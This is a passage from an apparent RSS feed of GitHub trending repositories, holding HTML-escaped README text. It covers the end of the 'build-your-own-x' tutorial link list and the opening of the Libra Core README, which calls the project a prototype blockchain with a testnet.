&lt;li&gt;&lt;a href="https://blog.saush.com/2009/03/17/write-an-internet-search-engine-with-200-lines-of-ruby-code/" rel="nofollow"&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;em&gt;Write an Internet search engine with 200 lines of Ruby code&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-build-your-own-web-server" class="anchor" aria-hidden="true" href="#build-your-own-web-server"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build your own &lt;code&gt;Web Server&lt;/code&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.codeproject.com/Articles/859108/Writing-a-Web-Server-from-Scratch" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;Writing a Web Server from Scratch&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.codementor.io/ziad-saab/let-s-code-a-web-server-from-scratch-with-nodejs-streams-h4uc9utji" rel="nofollow"&gt;&lt;strong&gt;Node.js&lt;/strong&gt;: &lt;em&gt;Let's code a web server from scratch with NodeJS Streams&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/antoaravinth/lets-build-express"&gt;&lt;strong&gt;Node.js&lt;/strong&gt;: &lt;em&gt;lets-build-express&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://station.clancats.com/writing-a-webserver-in-pure-php/" rel="nofollow"&gt;&lt;strong&gt;PHP&lt;/strong&gt;: &lt;em&gt;Writing a webserver in pure PHP&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://aosabook.org/en/500L/a-simple-web-server.html" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;A Simple Web Server&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://ruslanspivak.com/lsbaws-part1/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Let’s Build A Web Server.&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://defn.io/2018/02/25/web-app-from-scratch-01/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Web application from scratch&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://joaoventura.net/blog/2017/python-webserver/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Building a basic HTTP Server from scratch in Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.luisrei.com/articles/flaskrest.html" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Implementing a RESTful Web API with Python &amp;amp; Flask&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.honeybadger.io/building-a-simple-websockets-server-from-scratch-in-ruby/" rel="nofollow"&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;em&gt;Building a simple websockets server from scratch in Ruby&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-uncategorized" class="anchor" aria-hidden="true" href="#uncategorized"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Uncategorized&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://nand2tetris.org/" rel="nofollow"&gt;&lt;strong&gt;(any)&lt;/strong&gt;: &lt;em&gt;From NAND to Tetris: Building a Modern Computer From First Principles&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://aosabook.org/en/500L/the-same-origin-policy.html" rel="nofollow"&gt;&lt;strong&gt;Alloy&lt;/strong&gt;: &lt;em&gt;The Same-Origin Policy&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://dranger.com/ffmpeg/ffmpeg.html" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;How to Write a Video Player in Less Than 1000 Lines&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jamesroutley/write-a-hash-table"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Learn how to write a hash table in C&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.uninformativ.de/blog/postings/2018-02-24/0/POSTING-en.html" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;The very basics of a terminal emulator&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://brennan.io/2016/11/14/kernel-dev-ep3/" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Write a System Call&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://codepr.github.io/posts/sol-mqtt-broker" rel="nofollow"&gt;&lt;strong&gt;C&lt;/strong&gt;: &lt;em&gt;Sol - An MQTT broker from scratch&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/relativty/Relativ"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Build your own VR headset for $100&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://seasonofcode.com/posts/how-x-window-managers-work-and-how-to-write-one-part-i.html" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;How X Window Managers work and how to write one&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.tartanllama.xyz/writing-a-linux-debugger-setup/" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;Writing a Linux Debugger&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.lofibucket.com/articles/64k_intro.html" rel="nofollow"&gt;&lt;strong&gt;C++&lt;/strong&gt;: &lt;em&gt;How a 64k intro is made&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://16bpp.net/tutorials/csharp-networking" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;C# Networking: Create a TCP chater server, TCP games, UDP Pong and more&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.seanjoflynn.com/research/skeletal-animation.html" rel="nofollow"&gt;&lt;strong&gt;C#&lt;/strong&gt;: &lt;em&gt;Loading and rendering 3D skeletal animations from scratch in C# and GLSL&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://bernhardwenzel.com/articles/clojure-spellchecker/" rel="nofollow"&gt;&lt;strong&gt;Clojure&lt;/strong&gt;: &lt;em&gt;Building a spell-checker&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://kasvith.github.io/posts/lets-create-a-simple-lb-go/" rel="nofollow"&gt;&lt;strong&gt;Go&lt;/strong&gt;, &lt;em&gt;Let's Create a Simple Load Balancer&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLgCYzUzKIBE9HUJU-upNvl3TRVAo9W47y" rel="nofollow"&gt;&lt;strong&gt;Java&lt;/strong&gt;: &lt;em&gt;How to Build an Android Reddit App&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ronami/minipack"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Build Your Own Module Bundler - Minipack&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://levelup.gitconnected.com/understand-javascript-promises-by-building-a-promise-from-scratch-84c0fd855720" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Learn JavaScript Promises by Building a Promise from Scratch&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.mauriciopoppe.com/notes/computer-science/computation/promises/" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Implementing promises from scratch (TDD way)&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.usejournal.com/implement-your-own-call-apply-and-bind-method-in-javascript-42cc85dba1b" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Implement your own — call(), apply() and bind() method in JavaScript&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/trekhleb/javascript-algorithms"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;JavaScript Algorithms and Data Structures&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=xLHCMMGuN0Q" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;How to Make an Evolutionary Tetris AI&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pusher.com/tutorials/ride-hailing-react-native" rel="nofollow"&gt;&lt;strong&gt;JavaScript&lt;/strong&gt;: &lt;em&gt;Build a ride hailing app with React Native&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/kezhenxu94/cache-lite"&gt;&lt;strong&gt;Kotlin&lt;/strong&gt;: &lt;em&gt;Build Your Own Cache&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://xmonader.github.io/nimdays/day12_resp.html" rel="nofollow"&gt;&lt;strong&gt;Nim&lt;/strong&gt;: &lt;em&gt;Writing a Redis Protocol Parser&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://xmonader.github.io/nimdays/day11_buildsystem.html" rel="nofollow"&gt;&lt;strong&gt;Nim&lt;/strong&gt;: &lt;em&gt;Writing a Build system&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://xmonader.github.io/nimdays/day08_minitest.html" rel="nofollow"&gt;&lt;strong&gt;Nim&lt;/strong&gt;: &lt;em&gt;Writing a MiniTest Framework&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://xmonader.github.io/nimdays/day01_dmidecode.html" rel="nofollow"&gt;&lt;strong&gt;Nim&lt;/strong&gt;: &lt;em&gt;Writing a DMIDecode Parser&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://xmonader.github.io/nimdays/day05_iniparser.html" rel="nofollow"&gt;&lt;strong&gt;Nim&lt;/strong&gt;: &lt;em&gt;Writing a INI Parser&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://xmonader.github.io/nimdays/day04_asynclinkschecker.html" rel="nofollow"&gt;&lt;strong&gt;Nim&lt;/strong&gt;: &lt;em&gt;Writing a Link Checker&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://xmonader.github.io/nimdays/day07_shorturl.html" rel="nofollow"&gt;&lt;strong&gt;Nim&lt;/strong&gt;: &lt;em&gt;Writing a URL Shortening Service&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.webdevdrops.com/build-static-site-generator-nodejs-8969ebe34b22/" rel="nofollow"&gt;&lt;strong&gt;Node.js&lt;/strong&gt;: &lt;em&gt;Build a static site generator in 40 lines with Node.js&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://codeburst.io/building-a-simple-single-sign-on-sso-server-and-solution-from-scratch-in-node-js-ea6ee5fdf340" rel="nofollow"&gt;&lt;strong&gt;Node.js&lt;/strong&gt;: &lt;em&gt;Building A Simple Single Sign On(SSO) Server And Solution From Scratch In Node.js.&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.freecodecamp.org/how-to-create-a-real-world-node-cli-app-with-node-391b727bbed3" rel="nofollow"&gt;&lt;strong&gt;Node.js&lt;/strong&gt;: &lt;em&gt;How to create a real-world Node CLI app with Node&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://chaitya62.github.io/2018/04/29/Writing-your-own-MVC-from-Scratch-in-PHP.html" rel="nofollow"&gt;&lt;strong&gt;PHP&lt;/strong&gt;: &lt;em&gt;Write your own MVC from scratch in PHP&lt;/em&gt; &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://ilovephp.jondh.me.uk/en/tutorial/make-your-own-blog" rel="nofollow"&gt;&lt;strong&gt;PHP&lt;/strong&gt;: &lt;em&gt;Make your own blog&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://kevinsmith.io/modern-php-without-a-framework" rel="nofollow"&gt;&lt;strong&gt;PHP&lt;/strong&gt;: &lt;em&gt;Modern PHP Without a Framework&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=o64FV-ez6Gw" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Build a Deep Learning Library&lt;/em&gt;&lt;/a&gt; [video]&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.pyimagesearch.com/2014/09/01/build-kick-ass-mobile-document-scanner-just-5-minutes/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;How to Build a Kick-Ass Mobile Document Scanner in Just 5 Minutes&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://aosabook.org/en/500L/a-continuous-integration-system.html" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Continuous Integration System&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.datacamp.com/community/tutorials/recommender-systems-python" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Recommender Systems in Python: Beginner Tutorial&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@kopilov.vlad/detect-sms-spam-in-kaggle-with-scikit-learn-5f6afa7a3ca2" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Write SMS-spam detector with Scikit-learn&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.untrod.com/2016/06/simple-similar-products-recommendation-engine-in-python.html" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;A Simple Content-Based Recommendation Engine in Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.datacamp.com/community/tutorials/lstm-python-stock-market" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Stock Market Predictions with LSTM in Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://franpapers.com/en/algorithmic/2018-introduction-to-fountain-codes-lt-codes-with-python/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Build your own error-correction fountain code with Luby Transform Codes&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.paperspace.com/implementing-gans-in-tensorflow/" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Building a simple Generative Adversial Network (GAN) using Tensorflow&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://lethalbrains.com/learn-ml-algorithms-by-coding-decision-trees-439ac503c9a4" rel="nofollow"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;Learn ML Algorithms by coding: Decision Trees&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/cheery/json-algorithm"&gt;&lt;strong&gt;Python&lt;/strong&gt;: &lt;em&gt;JSON Decoding Algorithm&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://aosabook.org/en/500L/a-pedometer-in-the-real-world.html" rel="nofollow"&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;em&gt;A Pedometer in the Real World&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://iridakos.com/tutorials/2018/01/25/creating-a-gtk-todo-application-with-ruby" rel="nofollow"&gt;&lt;strong&gt;Ruby&lt;/strong&gt;: &lt;em&gt;Creating a Linux Desktop application with Ruby&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://limpet.net/mbrubeck/2014/08/08/toy-layout-engine-1.html" rel="nofollow"&gt;&lt;strong&gt;Rust&lt;/strong&gt;: &lt;em&gt;Let's build a browser engine&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/EmilHernvall/dnsguide/blob/master/README.md"&gt;&lt;strong&gt;Rust&lt;/strong&gt;: &lt;em&gt;Building a DNS server in Rust&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://nbaksalyar.github.io/2015/07/10/writing-chat-in-rust.html" rel="nofollow"&gt;&lt;strong&gt;Rust&lt;/strong&gt;: &lt;em&gt;Writing Scalable Chat Service from Scratch&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/g-plane/tiny-package-manager"&gt;&lt;strong&gt;TypeScript&lt;/strong&gt;: &lt;em&gt;Tiny Package Manager: Learns how npm or Yarn works&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-how-to-contribute" class="anchor" aria-hidden="true" href="#how-to-contribute"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;How to contribute&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Contributions are very welcome: &lt;a href="https://github.com/danistefanovic/build-your-own-x/issues/new"&gt;Submit tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Help me to review &lt;a href="https://github.com/danistefanovic/build-your-own-x/issues"&gt;pending submissions&lt;/a&gt; by leaving comments and "reactions"&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-license" class="anchor" aria-hidden="true" href="#license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;License&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/60561947585c982aee67ed3e3b25388184cc0aa3/687474703a2f2f6d6972726f72732e6372656174697665636f6d6d6f6e732e6f72672f70726573736b69742f627574746f6e732f38387833312f7376672f63632d7a65726f2e737667" alt="CC0" data-canonical-src="http://mirrors.creativecommons.org/presskit/buttons/88x31/svg/cc-zero.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;To the extent possible under law, &lt;a href="http://twitter.com/danistefanovic" rel="nofollow"&gt;Daniel Stefanovic&lt;/a&gt; has waived all copyright and related or neighboring rights to this work.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>danistefanovic</author><guid isPermaLink="false">https://github.com/danistefanovic/build-your-own-x</guid><pubDate>Sun, 19 Jan 2020 00:16:00 GMT</pubDate></item><item><title>libra/libra #17 in All Languages, Today</title><link>https://github.com/libra/libra</link><description>&lt;p&gt;&lt;i&gt;Libra’s mission is to enable a simple global currency and financial infrastructure that empowers billions of people.&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;a href="https://developers.libra.org" rel="nofollow"&gt;
	&lt;img width="200" src="./.assets/libra.png" alt="Libra Logo" style="max-width:100%;"&gt;
&lt;/a&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a href="https://circleci.com/gh/libra/libra" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/e7f548b0f26e9ae57bfbdd31456ab2e5fdbeb690/68747470733a2f2f636972636c6563692e636f6d2f67682f6c696272612f6c696272612e7376673f7374796c653d736869656c64" alt="CircleCI" data-canonical-src="https://circleci.com/gh/libra/libra.svg?style=shield" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="LICENSE"&gt;&lt;img src="https://camo.githubusercontent.com/129350f0083a7b3d4e7a0722c059005a127281b4/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6c6963656e73652d4170616368652d677265656e2e737667" alt="License" data-canonical-src="https://img.shields.io/badge/license-Apache-green.svg" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://codecov.io/gh/libra/libra" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/9052a11d678aa3d13484cc5308da1ab17e1f9922/68747470733a2f2f636f6465636f762e696f2f67682f6c696272612f6c696272612f6272616e63682f6d61737465722f67726170682f62616467652e737667" alt="codecov" data-canonical-src="https://codecov.io/gh/libra/libra/branch/master/graph/badge.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Libra Core implements a decentralized, programmable database which provides a financial infrastructure that can empower billions of people.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-note-to-developers" class="anchor" aria-hidden="true" href="#note-to-developers"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Note to Developers&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Libra Core is a prototype.&lt;/li&gt;
&lt;li&gt;The APIs are constantly evolving and designed to demonstrate types of functionality. Expect substantial changes before the release.&lt;/li&gt;
&lt;li&gt;We’ve launched a testnet that is a live demonstration of an early prototype of the Libra Blockchain software.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-contributing" class="anchor" aria-hidden="true" href="#contributing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contributing&lt;/h2&gt;
&lt;p&gt;To begin contributing, &lt;a href="https://libra.org/en-US/cla-sign/" rel="nofollow"&gt;sign the CLA&lt;/a&gt;. You can learn more about contributing to the Libra project by reading our &lt;a href="https://developers.libra.org/docs/community/contributing" rel="nofollow"&gt;Contribution Guide&lt;/a&gt; and by viewing our &lt;a href="https://developers.libra.org/docs/policies/code-of-conduct" rel="nofollow"&gt;Code of Conduct&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-getting-started" class="anchor" aria-hidden="true" href="#getting-started"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Getting Started&lt;/h2&gt;
&lt;h3&gt;&lt;a id="user-content-learn-about-libra" class="anchor" aria-hidden="true" href="#learn-about-libra"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Learn About Libra&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://developers.libra.org/docs/welcome-to-libra" rel="nofollow"&gt;Welcome&lt;/a&gt;&lt;/li&gt;
